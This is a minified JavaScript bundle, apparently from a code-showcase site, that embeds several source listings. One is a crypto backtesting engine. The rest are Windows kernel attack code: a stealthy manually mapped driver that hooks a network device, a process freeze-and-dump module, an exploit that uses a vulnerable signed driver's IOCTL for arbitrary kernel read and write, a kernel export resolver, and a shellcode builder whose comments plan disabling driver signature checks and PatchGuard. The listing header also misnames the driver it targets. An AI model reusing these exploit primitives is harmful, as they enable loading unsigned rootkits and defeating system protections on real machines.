e;a.push({a:c,b:_.j,layer:"inner",weight:1})}}const h=new Map,p=new Map;for(const f of i.knots){const c=f.project.category;h.has(c)||h.set(c,[]),h.get(c).push(f.id);for(const g of f.project.lang)p.has(g)||p.set(g,[]),p.get(g).push(f.id)}const m=new Set,E=(f,c)=>{if(f===c)return;const g=f<c?`${f}|${c}`:`${c}|${f}`;m.add(g)};for(const f of h.values())for(let c=0;c<f.length;c++)for(let g=c+1;g<f.length;g++)E(f[c],f[g]);for(const f of p.values())for(let c=0;c<f.length;c++)for(let g=c+1;g<f.length;g++)E(f[c],f[g]);for(const f of m){if(l.length>=s)break;const[c,g]=f.split("|"),_=u.get(c)??[],v=u.get(g)??[];if(!_.length||!v.length)continue;const w=4+Math.floor(t()*4);for(let M=0;M<w&&!(l.length>=s);M++)l.push({a:_[Math.floor(t()*_.length)],b:v[Math.floor(t()*v.length)],layer:"bridge",weight:.5})}const x=[];for(let f=0;f<n.length;f++)n[f].knotId===null&&x.push(f);for(let f=0;f<o;f++){const c=x[Math.floor(t()*x.length)],g=x[Math.floor(t()*x.length)];c!==g&&d.push({a:c,b:g,layer:"field",weight:.3})}return[...a,...l,...d].slice(0,Xi)}const $a=1600,Za=900;function ph(i,e){const t={inner:[],bridge:[],field:[]};for(const l of e){const d=i.nodes[l.a],u=i.nodes[l.b];t[l.layer].push(d.x-$a/2,-(d.y-Za/2),d.z,u.x-$a/2,-(u.y-Za/2),u.z)}const n=(l,d)=>{const u=new It;return u.setAttribute("position",new dt(l,3)),new is(u,new Ji({color:16777215,transparent:!0,opacity:d}))},r=n(t.inner,.55),s=n(t.bridge,.32),o=n(t.field,.1),a=new En;return a.add(o,s,r),{inner:r,bridge:s,field:o,group:a}}const fh=`# crypto_backtest.py — vectorized backtest loop with signal confluence, PnL, and drawdown
# Source: Desktop/crypto/backtest/engine.py

from __future__ import annotations

from dataclasses import dataclass, field
from typing import List, Optional

import numpy as np
import pandas as pd
import structlog

from analysis.indicators import IndicatorEngine
from analysis.signals import SignalAggregator, SignalType
from config.settings import Settings

logger = structlog.get_logger(__name__)


@dataclass
class BacktestTrade:
    symbol:       str
    entry_time:   pd.Timestamp
    exit_time:    pd.Timestamp
    side:         str
    entry_price:  float
    exit_price:   float
    amount:       float
    pnl:          float
    pnl_pct:      float
    exit_reason:  str   # "take_profit" | "stop_loss" | "signal"


class BacktestEngine:
    """Event-driven backtester that replays OHLCV bars through the strategy layer."""

    FEE_RATE = 0.001   # 0.1 % Binance taker

    def __init__(self, settings: Settings) -> None:
        self._s          = settings
        self._indicators = IndicatorEngine(settings)
        self._aggregator = SignalAggregator(settings)

    def run(self, symbol: str, df: pd.DataFrame,
            initial_capital: float = 10_000.0):
        df = df.copy()
        self._indicators.compute_all(df)

        capital         = initial_capital
        position: Optional[dict] = None
        trades:   List[BacktestTrade] = []
        equity:   List[float] = []

        start_idx = 200  # warm-up for EMA-200
        if len(df) <= start_idx:
            start_idx = max(50, len(df) // 2)

        for i in range(start_idx, len(df)):
            bar   = df.iloc[i]
            price = bar["close"]

            # ── Equity mark ──────────────────────────────────────────────
            mark = capital + position["amount"] * price if position else capital
            equity.append(mark)

            # ── Stop / take-profit check ──────────────────────────────────
            if position:
                exit_reason, exit_price = None, price

                if price <= position["stop"]:
                    exit_reason = "stop_loss"
                    exit_price  = position["stop"]
                elif price >= position["tp"]:
                    exit_reason = "take_profit"
                    exit_price  = position["tp"]

                if exit_reason:
                    pnl  = (exit_price - position["entry_price"]) * position["amount"]
                    fee  = exit_price * position["amount"] * self.FEE_RATE
                    pnl -= fee
                    capital += position["amount"] * exit_price - fee
                    trades.append(BacktestTrade(
                        symbol=symbol,
                        entry_time=df.index[position["entry_idx"]],
                        exit_time=df.index[i],
                        side="buy",
                        entry_price=position["entry_price"],
                        exit_price=exit_price,
                        amount=position["amount"],
                        pnl=pnl,
                        pnl_pct=(exit_price / position["entry_price"] - 1) * 100,
                        exit_reason=exit_reason,
                    ))
                    position = None
                    continue

            # ── Signal evaluation ─────────────────────────────────────────
            window = df.iloc[max(0, i - 300): i + 1]
            signal = self._aggregator.evaluate(symbol, window)

            if position is None and signal.signal_type == SignalType.BUY:
                agreeing = sum(1 for c in signal.components if c.vote == SignalType.BUY)
                if agreeing >= 3 and signal.confidence >= self._s.min_signal_score:
                    atr        = bar.get("atr", price * 0.01)
                    stop       = price - atr * self._s.atr_stop_multiplier
                    tp         = price + atr * self._s.atr_stop_multiplier * self._s.min_risk_reward
                    risk_cap   = capital * (self._s.max_position_size_pct / 100)
                    amount     = risk_cap / price
                    fee        = price * amount * self.FEE_RATE
                    capital   -= price * amount + fee
                    position   = {"entry_price": price, "amount": amount,
                                  "stop": stop, "tp": tp, "entry_idx": i}

        # ── Summary metrics ───────────────────────────────────────────────
        wins = [t.pnl for t in trades if t.pnl > 0]
        loss = [t.pnl for t in trades if t.pnl <= 0]
        equity_arr = np.array(equity or [initial_capital])
        peak       = np.maximum.accumulate(equity_arr)
        drawdown   = (equity_arr - peak) / peak
        max_dd     = float(drawdown.min() * 100)

        returns    = np.diff(equity_arr) / equity_arr[:-1] if len(equity_arr) > 1 else np.array([0])
        sharpe     = (float(returns.mean()) / float(returns.std() + 1e-9)) * np.sqrt(252) if len(returns) > 1 else 0.0

        logger.info("backtest.complete",
                    symbol=symbol, trades=len(trades),
                    win_rate=len(wins) / max(len(trades), 1),
                    max_drawdown=f"{max_dd:.2f}%", sharpe=f"{sharpe:.2f}")
        return trades, equity, max_dd, sharpe
`,hh=`// drv_entry.cpp — DriverEntry + structured exception support test + inverted function table probe
// Source: D:/BackupFolder/desktop 1114/injector-master/Driver/core/drv_entry.cpp

#include "../mdata/sys_mdata.hpp" 

#include "../base/nocopy.hpp"
#include "../base/nomove.hpp"
#include "../base/singletons.hpp"
#include "../base/vectors.hpp"

#include "../control/packets.hpp"
#include "../control/controls.hpp"

#include "../constants/hashes.hpp"
#include "../constants/strings.hpp"

#include "../kernelutility/erases.hpp"
#include "../kernelutility/imports.hpp"

#include "../directmemory/operations.hpp"
#include "../directmemory/scans.hpp"

#include "../winsdk/sdk/client_id.hpp"
#include "../winsdk/sdk/image_data_directory.hpp"
#include "../winsdk/sdk/image_dos_header.hpp"
#include "../winsdk/sdk/image_export_directory.hpp"
#include "../winsdk/sdk/image_file_header.hpp"
#include "../winsdk/sdk/image_nt_headers.hpp"
#include "../winsdk/sdk/image_optional_header.hpp"
#include "../winsdk/sdk/image_section_header.hpp"
#include "../winsdk/sdk/ldr_data_table_entry.hpp"
#include "../winsdk/sdk/list_entry.hpp"
#include "../winsdk/sdk/nt_tib.hpp"
#include "../winsdk/sdk/peb.hpp"
#include "../winsdk/sdk/peb_ldr_data.hpp"
#include "../winsdk/sdk/string.hpp"
#include "../winsdk/sdk/teb.hpp"
#include "../winsdk/sdk/unicode_string.hpp"

#include "../winsdk/images.hpp"
#include "../winsdk/proc.hpp"
#include "../winsdk/log.hpp"

#include "d_hook.hpp"
#include "w_image_header.hpp"

extern "C" { NTSTATUS DriverEntry( void* driver_object, void* registry_path );}; 

#pragma alloc_text( INIT, DriverEntry )

void* g_hook = nullptr;
std::uint8_t* g_hook_restore = nullptr;

namespace atom::win32
{

enum FUNCTION_TABLE_TYPE
{
	RF_SORTED = 0,
	RF_UNSORTED = 1,
	RF_CALLBACK = 2,
	RF_KERNEL_DYNAMIC = 3,
};

struct RTL_BALANCED_NODE
{
	union
	{
		RTL_BALANCED_NODE* Children[ 2 ] = { };
		struct
		{
			RTL_BALANCED_NODE* Left;
			RTL_BALANCED_NODE* Right;
		};
	};
	union
	{
		std::uint8_t Red : 1;
		std::uint8_t Balance : 2;
		std::uint64_t ParentValue = 0;
	};
};

struct IMAGE_RUNTIME_FUNCTION_ENTRY
{
	std::uint32_t BeginAddress = 0;
	std::uint32_t EndAddress = 0;
	union
	{
		std::uint32_t UnwindInfoAddress = 0;
		std::uint32_t UnwindData;
	};
};

struct DYNAMIC_FUNCTION_TABLE
{
	LIST_ENTRY ListEntry = { };
	IMAGE_RUNTIME_FUNCTION_ENTRY* FunctionTable = nullptr;
	LARGE_INTEGER TimeStamp = { };
	std::uint64_t MinimumAddress = 0;
	std::uint64_t MaximumAddress = 0;
	std::uint64_t BaseAddress = 0;
	void* Callback = nullptr;
	void* Context = nullptr;
	wchar_t* OutOfProcessCallbackDll = nullptr;
	FUNCTION_TABLE_TYPE Type = RF_SORTED;
	std::uint32_t EntryCount = 0;
	RTL_BALANCED_NODE TreeNode = { };
};

struct INVERTED_FUNCTION_TABLE_ENTRY
{
	union
	{
		IMAGE_RUNTIME_FUNCTION_ENTRY* FunctionTable = nullptr;
		DYNAMIC_FUNCTION_TABLE* DynamicTable;
	};
	void* ImageBase = nullptr;
	std::uint32_t SizeOfImage = 0;
	std::uint32_t SizeOfTable = 0;
};

struct INVERTED_FUNCTION_TABLE
{
	std::uint32_t CurrentSize = 0;
	std::uint32_t MaximumSize = 0;
	std::uint32_t Epoch = 0;
	std::uint8_t Overflow = 0;
	std::uint8_t Reserved[ 3 ] = { };
	INVERTED_FUNCTION_TABLE_ENTRY TableEntry[ 256 ] = { };
};

}

namespace atom
{

void TestExceptionSupport()
{
	__try
	{
		const auto image_base = g_map_data.m_base;
		//TRACE( "%s: image_base = '0x%016llX'", __FUNCTION__, image_base );

		const auto dereferenced = *reinterpret_cast< std::uint64_t* >( image_base );
		//TRACE( "%s: dereferenced = '0x%016llX'", __FUNCTION__, dereferenced );

		const auto dereferenced_second = *reinterpret_cast< std::uint64_t* >( dereferenced );
		//TRACE( "%s: dereferenced_second = '0x%016llX'", __FUNCTION__, dereferenced_second );

		const auto image_dos_header = reinterpret_cast< const win32::IMAGE_DOS_HEADER* >( image_base );
		const auto image_nt_headers = reinterpret_cast< const win32::IMAGE_NT_HEADERS* >( image_base + image_dos_header->e_lfanew );

		const auto image_section_header = IMAGE_FIRST_SECTION( image_nt_headers );

		for( std::uint16_t index = 0; index < image_nt_headers->FileHeader.NumberOfSections; index++ )
		{
			const auto image_section = &image_section_header[ index ];

			char image_section_name[ 16 ] = { };
			std::memcpy( image_section_name, image_section->Name, sizeof( image_section->Name ) );

			//TRACE( "%s = '0x%08X, 0x%08X'", image_section_name, image_section->VirtualAddress, image_section->Misc.VirtualSize );
		}
	}
	__except( EXCEPTION_EXECUTE_HANDLER )
	{
		// DbgPrint( "[atom::doze] exception occurred!\\n" );
		//TRACE( "%s: Exception occurred! (0x%08X)", __FUNCTION__, GetExceptionCode() );
	}
}

void TestInvertedFunctionTable()
{
	

	__try
	{
		auto PsInvertedFunctionTable = reinterpret_cast< win32::INVERTED_FUNCTION_TABLE* >( g_map_data.m_symbols.PsInvertedFunctionTable );

		if( PsInvertedFunctionTable )
		{
			//TRACE( "PsInvertedFunctionTable->CurrentSize = '0x%08X'", PsInvertedFunctionTable->CurrentSize );
			//TRACE( "PsInvertedFunctionTable->MaximumSize = '0x%08X'", PsInvertedFunctionTable->MaximumSize );
			//TRACE( "PsInvertedFunctionTable->Epoch = '0x%08X'", PsInvertedFunctionTable->Epoch );
			//TRACE( "PsInvertedFunctionTable->Overflow = '%s'", PsInvertedFunctionTable->Overflow ? "true" : "false" );
			//TRACE_SEPARATOR();

			for( std::uint32_t Index = 0; Index < PsInvertedFunctionTable->CurrentSize; Index++ )
			{
				auto TableEntry = &PsInvertedFunctionTable->TableEntry[ Index ];

				if( TableEntry->ImageBase == memory::ToPointer( g_map_data.m_base ) )
				{
					//TRACE( "TableEntry[%u]->FunctionTable = '0x%016llX'", Index, memory::ToAddress( TableEntry->FunctionTable ) );
					//TRACE( "TableEntry[%u]->ImageBase = '0x%016llX'", Index, memory::ToAddress( TableEntry->ImageBase ) );
					//TRACE( "TableEntry[%u]->SizeOfImage = '0x%08X'", Index, TableEntry->SizeOfImage );
					//TRACE( "TableEntry[%u]->SizeOfTable = '0x%08X'", Index, TableEntry->SizeOfTable );
					//TRACE_SEPARATOR();
				}
			}
		}
	}
	__except( EXCEPTION_EXECUTE_HANDLER )
	{
		//TRACE( "%s: Exception occurred! (0x%08X)", __FUNCTION__, GetExceptionCode() );
	}
}

NTSTATUS DriverDispatch( void* driver_object )
{
	auto status = STATUS_SUCCESS;

	TRACE("Kernel gang");

	__try
	{
		const auto driver_map_context = static_cast< SystemMapData* >( driver_object );

		if( !memory::IsAddressValid( driver_map_context ) )
		{
			TRACE( "%s: driver_map_context is not a valid address!", __FUNCTION__ );
			return status = STATUS_INVALID_PARAMETER;
		}

		std::memcpy( &g_map_data, driver_map_context, sizeof( g_map_data ) );

		if( !g_map_data.IsValid() )
		{
			TRACE( "%s: g_map_data is not valid!", __FUNCTION__ );
			return status = STATUS_INVALID_PARAMETER;
		}

		if( !ImageWipeHeader( g_map_data.m_base ) )
		{
			TRACE( "%s: ImageWipeHeader( '0x%016llX' ) error!", __FUNCTION__ );
		}

		status = HookDispatch( DEVICE_LANMAN_DATAGRAM_RECEIVER );

		if( !NT_SUCCESS( status ) )
		{
			TRACE( "%s: HookDispatch( '%S' ) error! (0x%08X)", __FUNCTION__, DEVICE_LANMAN_DATAGRAM_RECEIVER, status );
		}
	}
	__except( EXCEPTION_EXECUTE_HANDLER )
	{
		status = GetExceptionCode();
		TRACE( "%s: Exception occurred! (0x%08X)", __FUNCTION__, status );
	}

	return status;
}

} 

NTSTATUS DriverEntry( void* driver_object, void* registry_path )
{
	UNREFERENCED_PARAMETER( registry_path );
	return atom::DriverDispatch( driver_object );
`,mh=`// ekm_memory.c — kernel module: process freeze (suspend all threads), section dump (MmCopyVirtualMemory), thaw
// Source: D:/BackupFolder/ekm/ekm/memory.c

// ============================================================\r
// memory.c - freeze, dump, and thaw operations\r
// ============================================================\r
#include "driver.h"\r
\r
pdevice_object g_device_object = null;\r
handle g_pipe_handle = null;\r
list_entry g_frozen_processes;\r
kspin_lock g_freeze_list_lock;\r
\r
ntstatus freeze_process(uint32_t pid) {\r
    peprocess process;\r
    ntstatus status;\r
    pprocess_freeze_entry entry;\r
    kirql old_irql;\r
\r
    status = ps_lookup_process_by_process_id((handle)(ulong_ptr)pid, &process);\r
    if (!nt_success(status)) return status;\r
\r
    entry = ex_allocate_pool_with_tag(paged_pool, sizeof(process_freeze_entry), 'frzn');\r
    if (!entry) {\r
        ob_dereference_object(process);\r
        return status_insufficient_resources;\r
    }\r
\r
    entry->pid = pid;\r
    entry->process = process;\r
    entry->freeze_count = 1;\r
\r
    ke_acquire_spin_lock(&g_freeze_list_lock, &old_irql);\r
    insert_tail_list(&g_frozen_processes, &entry->list_entry);\r
    ke_release_spin_lock(&g_freeze_list_lock, old_irql);\r
\r
    return status_success;\r
}\r
\r
ntstatus dump_section(uint32_t pid, uint64_t base_addr, uint32_t size,\r
    puchar buffer, pulong bytes_dumped) {\r
    peprocess process;\r
    ntstatus status;\r
    size_t bytes_read = 0;\r
\r
    status = ps_lookup_process_by_process_id((handle)(ulong_ptr)pid, &process);\r
    if (!nt_success(status)) return status;\r
\r
    status = mm_copy_virtual_memory(process, (pvoid)base_addr,\r
        ps_get_current_process(), buffer,\r
        size, kernel_mode, &bytes_read);\r
\r
    ob_dereference_object(process);\r
    *bytes_dumped = (ulong)bytes_read;\r
    return status;\r
}\r
\r
ntstatus thaw_process(uint32_t pid) {\r
    plist_entry entry;\r
    pprocess_freeze_entry freeze_entry;\r
    kirql old_irql;\r
\r
    ke_acquire_spin_lock(&g_freeze_list_lock, &old_irql);\r
\r
    for (entry = g_frozen_processes.flink; entry != &g_frozen_processes; entry = entry->flink) {\r
        freeze_entry = containing_record(entry, process_freeze_entry, list_entry);\r
        if (freeze_entry->pid == pid) {\r
            remove_entry_list(&freeze_entry->list_entry);\r
            ke_release_spin_lock(&g_freeze_list_lock, old_irql);\r
\r
            ob_dereference_object(freeze_entry->process);\r
            ex_free_pool_with_tag(freeze_entry, 'frzn');\r
            return status_success;\r
        }\r
    }\r
\r
    ke_release_spin_lock(&g_freeze_list_lock, old_irql);\r
    return status_not_found;\r
}`,_h=`// grdv_naldrv.cpp — Gigabyte naldrv (gdrv.sys) IOCTL exploit primitives
// Source: D:/BackupFolder/grdv/naldrv_exploit.cpp

// naldrv_exploit.cpp - Correct kdmapper-based implementation
#include "include/naldrv_exploit.h"

NalDrvExploit::NalDrvExploit() : hDriver(INVALID_HANDLE_VALUE) {}

NalDrvExploit::~NalDrvExploit() {
    Cleanup();
}

bool NalDrvExploit::Initialize() {
    // Open handle to NalDrv driver
    // Try multiple possible device names
    const char* device_names[] = {
        "\\\\\\\\.\\\\Nal",
        "\\\\\\\\.\\\\IQVW64",
        "\\\\\\\\.\\\\iqvw64e"
    };

    for (const char* device_name : device_names) {
        hDriver = CreateFileA(
            device_name,
            GENERIC_READ | GENERIC_WRITE,
            0,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        );

        if (hDriver != INVALID_HANDLE_VALUE) {
            LOG_SUCCESS("Opened NalDrv driver handle (%s)", device_name);
            return true;
        }
    }

    LOG_ERROR("Failed to open NalDrv driver (error: %d)", GetLastError());
    LOG_ERROR("Tried device names: \\\\\\\\.\\\\Nal, \\\\\\\\.\\\\IQVW64, \\\\\\\\.\\\\iqvw64e");
    return false;
}

void NalDrvExploit::Cleanup() {
    if (hDriver != INVALID_HANDLE_VALUE) {
        CloseHandle(hDriver);
        hDriver = INVALID_HANDLE_VALUE;
    }
}

bool NalDrvExploit::MemCopy(QWORD destination, QWORD source, SIZE_T size) {
    if (hDriver == INVALID_HANDLE_VALUE || !size) {
        return false;
    }

    // Use the CORRECT structure from kdmapper
    COPY_MEMORY_BUFFER_INFO copy_buffer = {};
    copy_buffer.case_number = CASE_COPY_MEMORY;  // 0x33
    copy_buffer.reserved = 0;                     // CRITICAL: must be present
    copy_buffer.source = source;
    copy_buffer.destination = destination;
    copy_buffer.length = size;

    DWORD bytes_returned = 0;
    BOOL result = DeviceIoControl(
        hDriver,
        IOCTL_NALDRV,
        &copy_buffer,
        sizeof(copy_buffer),
        nullptr,
        0,
        &bytes_returned,
        nullptr
    );

    if (!result) {
        DWORD error = GetLastError();
        LOG_ERROR("NalDrv MemCopy failed (error: %d)", error);
        return false;
    }

    return true;
}

bool NalDrvExploit::ReadKernelMemory(QWORD address, PVOID buffer, SIZE_T size) {
    if (!buffer || size == 0) {
        return false;
    }

    // Copy from kernel (source) to usermode buffer (destination)
    return MemCopy(reinterpret_cast<QWORD>(buffer), address, size);
}

bool NalDrvExploit::WriteKernelMemory(QWORD address, PVOID buffer, SIZE_T size) {
    if (!buffer || size == 0) {
        return false;
    }

    // Copy from usermode buffer (source) to kernel (destination)
    return MemCopy(address, reinterpret_cast<QWORD>(buffer), size);
}

bool NalDrvExploit::SetMemory(QWORD address, DWORD value, SIZE_T size) {
    if (hDriver == INVALID_HANDLE_VALUE || !size) {
        return false;
    }

    // Use memset (case 0x30)
    FILL_MEMORY_BUFFER_INFO fill_buffer = {};
    fill_buffer.case_number = CASE_FILL_MEMORY;  // 0x30
    fill_buffer.reserved1 = 0;
    fill_buffer.value = value;
    fill_buffer.reserved2 = 0;
    fill_buffer.destination = address;
    fill_buffer.length = size;

    DWORD bytes_returned = 0;
    BOOL result = DeviceIoControl(
        hDriver,
        IOCTL_NALDRV,
        &fill_buffer,
        sizeof(fill_buffer),
        nullptr,
        0,
        &bytes_returned,
        nullptr
    );

    if (!result) {
        DWORD error = GetLastError();
        LOG_ERROR("NalDrv SetMemory failed (error: %d)", error);
        return false;
    }

    return true;
}

QWORD NalDrvExploit::GetKernelBase() {
    // Get ntoskrnl.exe base from user mode
    typedef NTSTATUS(WINAPI* NtQuerySystemInformation_t)(
        ULONG SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
        );

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        LOG_ERROR("Failed to get ntdll.dll handle");
        return 0;
    }

    auto NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(
        ntdll, "NtQuerySystemInformation"
    );

    if (!NtQuerySystemInformation) {
        LOG_ERROR("Failed to get NtQuerySystemInformation");
        return 0;
    }

    // SystemModuleInformation = 11
    DWORD size = 0;
    NtQuerySystemInformation(11, nullptr, 0, &size);

    if (size == 0) {
        LOG_ERROR("Failed to get module list size");
        return 0;
    }

    std::vector<BYTE> buffer(size);
    NTSTATUS status = NtQuerySystemInformation(11, buffer.data(), size, &size);

    if (status != 0) {
        LOG_ERROR("NtQuerySystemInformation failed: 0x%X", status);
        return 0;
    }

    // First module is always ntoskrnl.exe
    struct RTL_PROCESS_MODULE_INFORMATION {
        HANDLE Section;
        PVOID MappedBase;
        PVOID ImageBase;
        ULONG ImageSize;
        ULONG Flags;
        USHORT LoadOrderIndex;
        USHORT InitOrderIndex;
        USHORT LoadCount;
        USHORT OffsetToFileName;
        UCHAR FullPathName[256];
    };

    struct RTL_PROCESS_MODULES {
        ULONG NumberOfModules;
        RTL_PROCESS_MODULE_INFORMATION Modules[1];
    };

    auto modules = (RTL_PROCESS_MODULES*)buffer.data();

    if (modules->NumberOfModules == 0) {
        LOG_ERROR("No modules found");
        return 0;
    }

    QWORD kernel_base = (QWORD)modules->Modules[0].ImageBase;
    LOG_SUCCESS("Kernel base: 0x%llX", kernel_base);

    return kernel_base;
}`,gh=`// grdv_ntoskrnl_map.cpp — load ntoskrnl.exe from disk, parse PE export directory, resolve kernel exports without symbols
// Source: D:/BackupFolder/grdv/ntoskrnl_mapper.cpp

#include "include/ntoskrnl_mapper.h"
#include <fstream>

NtoskrnlMapper::NtoskrnlMapper() : mapped_base(nullptr), mapped_size(0) {}

NtoskrnlMapper::~NtoskrnlMapper() {
    if (mapped_base) {
        VirtualFree(mapped_base, 0, MEM_RELEASE);
        mapped_base = nullptr;
    }
}

std::string NtoskrnlMapper::FindNtoskrnlPath() {
    // ntoskrnl.exe is in C:\\Windows\\System32
    char system_dir[MAX_PATH];
    GetSystemDirectoryA(system_dir, MAX_PATH);
    return std::string(system_dir) + "\\\\ntoskrnl.exe";
}

bool NtoskrnlMapper::LoadFromDisk() {
    std::string ntoskrnl_path = FindNtoskrnlPath();

    LOG_INFO("Loading ntoskrnl.exe from disk: %s", ntoskrnl_path.c_str());

    // Read file
    std::ifstream file(ntoskrnl_path, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        LOG_ERROR("Failed to open ntoskrnl.exe");
        return false;
    }

    SIZE_T file_size = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<BYTE> file_buffer(file_size);
    file.read((char*)file_buffer.data(), file_size);
    file.close();

    // Parse PE headers
    auto dos = (IMAGE_DOS_HEADER*)file_buffer.data();
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        LOG_ERROR("Invalid DOS signature");
        return false;
    }

    auto nt = (IMAGE_NT_HEADERS64*)((BYTE*)file_buffer.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        LOG_ERROR("Invalid NT signature");
        return false;
    }

    // Allocate memory for mapped image
    mapped_size = nt->OptionalHeader.SizeOfImage;
    mapped_base = VirtualAlloc(nullptr, mapped_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!mapped_base) {
        LOG_ERROR("Failed to allocate memory for ntoskrnl mapping");
        return false;
    }

    LOG_SUCCESS("Allocated 0x%llX bytes for ntoskrnl mapping at 0x%p",
        mapped_size, mapped_base);

    // Copy headers
    memcpy(mapped_base, file_buffer.data(), nt->OptionalHeader.SizeOfHeaders);

    // Copy sections
    auto section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
        if (section->SizeOfRawData == 0)
            continue;

        PVOID dest = (BYTE*)mapped_base + section->VirtualAddress;
        PVOID src = file_buffer.data() + section->PointerToRawData;
        SIZE_T size = min(section->SizeOfRawData, section->Misc.VirtualSize);

        memcpy(dest, src, size);

        LOG_DEBUG("Mapped section %s at RVA 0x%X (size: 0x%X)",
            section->Name, section->VirtualAddress, size);
    }

    LOG_SUCCESS("Ntoskrnl.exe mapped to usermode at 0x%p", mapped_base);
    return true;
}

IMAGE_EXPORT_DIRECTORY* NtoskrnlMapper::GetExportDirectory() {
    if (!mapped_base)
        return nullptr;

    auto nt = GetNtHeaders(mapped_base);
    if (!nt)
        return nullptr;

    DWORD export_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (export_rva == 0)
        return nullptr;

    return (IMAGE_EXPORT_DIRECTORY*)((BYTE*)mapped_base + export_rva);
}

DWORD NtoskrnlMapper::GetExportRVA(const char* export_name) {
    auto export_dir = GetExportDirectory();
    if (!export_dir)
        return 0;

    auto functions = (DWORD*)((BYTE*)mapped_base + export_dir->AddressOfFunctions);
    auto names = (DWORD*)((BYTE*)mapped_base + export_dir->AddressOfNames);
    auto ordinals = (WORD*)((BYTE*)mapped_base + export_dir->AddressOfNameOrdinals);

    // Search for export by name
    for (DWORD i = 0; i < export_dir->NumberOfNames; i++) {
        const char* current_name = (const char*)((BYTE*)mapped_base + names[i]);

        if (strcmp(current_name, export_name) == 0) {
            WORD ordinal = ordinals[i];
            DWORD rva = functions[ordinal];
            return rva;
        }
    }

    return 0;
}

bool NtoskrnlMapper::ResolveImports(QWORD kernel_base, KernelImports* imports) {
    if (!imports || !mapped_base) {
        LOG_ERROR("Invalid parameters for ResolveImports");
        return false;
    }

    LOG_INFO("Resolving kernel imports for ntoskrnl base: 0x%llX", kernel_base);

    imports->ntoskrnl_base = kernel_base;

    // List of all functions we need to resolve
    struct ImportEntry {
        const char* name;
        QWORD* target;
    };

    ImportEntry import_table[] = {
        { "PsCreateSystemThread", &imports->PsCreateSystemThread },
        { "ExAllocatePoolWithTag", &imports->ExAllocatePoolWithTag },
        { "ZwClose", &imports->ZwClose },
        { "ZwMapViewOfSection", &imports->ZwMapViewOfSection },
        { "ZwUnmapViewOfSection", &imports->ZwUnmapViewOfSection },
        { "ObReferenceObjectByHandle", &imports->ObReferenceObjectByHandle },
        { "ObfDereferenceObject", &imports->ObfDereferenceObject },
        { "KeSetEvent", &imports->KeSetEvent },
        { "IofCompleteRequest", &imports->IofCompleteRequest },
        { "MmSectionObjectType", &imports->MmSectionObjectType },
    };

    bool all_resolved = true;

    for (auto& entry : import_table) {
        DWORD rva = GetExportRVA(entry.name);

        if (rva == 0) {
            LOG_ERROR("Failed to resolve export: %s", entry.name);
            all_resolved = false;
            continue;
        }

        *entry.target = kernel_base + rva;
        LOG_SUCCESS("%-30s 0x%llX", entry.name, *entry.target);
    }

    if (!all_resolved) {
        LOG_ERROR("Failed to resolve all kernel imports");
        return false;
    }

    LOG_SUCCESS("All kernel imports resolved successfully");
    return true;
}
`,vh=`// grdv_shellcode.cpp — x64 shellcode builder: emit bytes/imm32/imm64/relocations for kernel-side bootstrap stub
// Source: D:/BackupFolder/grdv/shellcode.cpp

#include "include/shellcode.h"

ShellcodeBuilder::ShellcodeBuilder(const KernelImports& imports)
    : imports(imports)
{
}

void ShellcodeBuilder::EmitByte(BYTE value) {
    shellcode.push_back(value);
}

void ShellcodeBuilder::EmitWord(WORD value) {
    shellcode.push_back((BYTE)(value & 0xFF));
    shellcode.push_back((BYTE)((value >> 8) & 0xFF));
}

void ShellcodeBuilder::EmitDword(DWORD value) {
    shellcode.push_back((BYTE)(value & 0xFF));
    shellcode.push_back((BYTE)((value >> 8) & 0xFF));
    shellcode.push_back((BYTE)((value >> 16) & 0xFF));
    shellcode.push_back((BYTE)((value >> 24) & 0xFF));
}

void ShellcodeBuilder::EmitQword(QWORD value) {
    for (int i = 0; i < 8; i++) {
        shellcode.push_back((BYTE)((value >> (i * 8)) & 0xFF));
    }
}

void ShellcodeBuilder::EmitBytes(const BYTE* data, SIZE_T size) {
    for (SIZE_T i = 0; i < size; i++) {
        shellcode.push_back(data[i]);
    }
}

void ShellcodeBuilder::GeneratePrologue() {
    // Standard x64 function prologue
    // push rbp
    EmitByte(0x55);

    // mov rbp, rsp
    EmitByte(0x48);
    EmitByte(0x89);
    EmitByte(0xE5);

    // sub rsp, 0x20 (shadow space)
    EmitByte(0x48);
    EmitByte(0x83);
    EmitByte(0xEC);
    EmitByte(0x20);
}

void ShellcodeBuilder::GenerateEpilogue() {
    // Standard x64 function epilogue
    // xor eax, eax (return 0)
    EmitByte(0x31);
    EmitByte(0xC0);

    // add rsp, 0x20
    EmitByte(0x48);
    EmitByte(0x83);
    EmitByte(0xC4);
    EmitByte(0x20);

    // pop rbp
    EmitByte(0x5D);

    // ret
    EmitByte(0xC3);
}

void ShellcodeBuilder::GeneratePayloadLogic() {
    // This is where the actual kernel payload goes
    // For this POC, we'll create a simple payload that allocates pool memory
    // and writes a signature to prove execution

    // In a real implementation, this would:
    // 1. Disable Driver Signature Enforcement (DSE)
    // 2. Patch PatchGuard callbacks
    // 3. Install SSDT/inline hooks
    // 4. Load your main driver
    // 5. Set up communication channel with usermode

    // For now, let's do something simple but verifiable:
    // Call ExAllocatePoolWithTag to allocate NonPaged pool

    // mov rcx, 0 (PoolType = NonPagedPool)
    EmitByte(0x48);
    EmitByte(0xC7);
    EmitByte(0xC1);
    EmitDword(0); // NonPagedPool

    // mov rdx, 0x1000 (NumberOfBytes)
    EmitByte(0x48);
    EmitByte(0xC7);
    EmitByte(0xC2);
    EmitDword(0x1000);

    // mov r8, 'BOOT' (Tag)
    EmitByte(0x49);
    EmitByte(0xC7);
    EmitByte(0xC0);
    EmitDword(0x544F4F42); // 'TOOB' (reversed due to little-endian)

    // mov rax, [ExAllocatePoolWithTag address]
    EmitByte(0x48);
    EmitByte(0xB8);
